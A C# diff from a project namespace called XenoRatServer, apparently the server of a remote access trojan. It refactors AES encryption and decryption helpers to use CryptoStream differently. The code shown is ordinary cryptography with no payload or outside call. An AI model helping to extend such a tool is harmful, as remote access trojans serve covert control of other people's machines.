@@ -14,15 +14,13 @@ namespace XenoRatServer
             {
                 aesAlg.Key = key;
                 aesAlg.IV = IV;
-                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
                 using (MemoryStream msEncrypt = new MemoryStream())
                 {
-                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, aesAlg.CreateEncryptor(), CryptoStreamMode.Write))
                     {
                         csEncrypt.Write(data, 0, data.Length);
-                        csEncrypt.FlushFinalBlock();
-                        encrypted = msEncrypt.ToArray();
                     }
+                    encrypted = msEncrypt.ToArray();
                 }
             }
             return encrypted;
@@ -36,14 +34,15 @@ namespace XenoRatServer
             {
                 aesAlg.Key = key;
                 aesAlg.IV = IV;
-                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
-                using (MemoryStream ms = new MemoryStream())
+                using (MemoryStream msDecrypt = new MemoryStream(data))
                 {
-                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Write))
+                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, aesAlg.CreateDecryptor(), CryptoStreamMode.Read))
                     {
-                        cs.Write(data, 0, data.Length);
-                        cs.FlushFinalBlock();
-                        decrypted = ms.ToArray();
+                        using (MemoryStream ms = new MemoryStream())
+                        {
+                            csDecrypt.CopyTo(ms);
+                            decrypted = ms.ToArray();
+                        }
                     }
                 }
             }
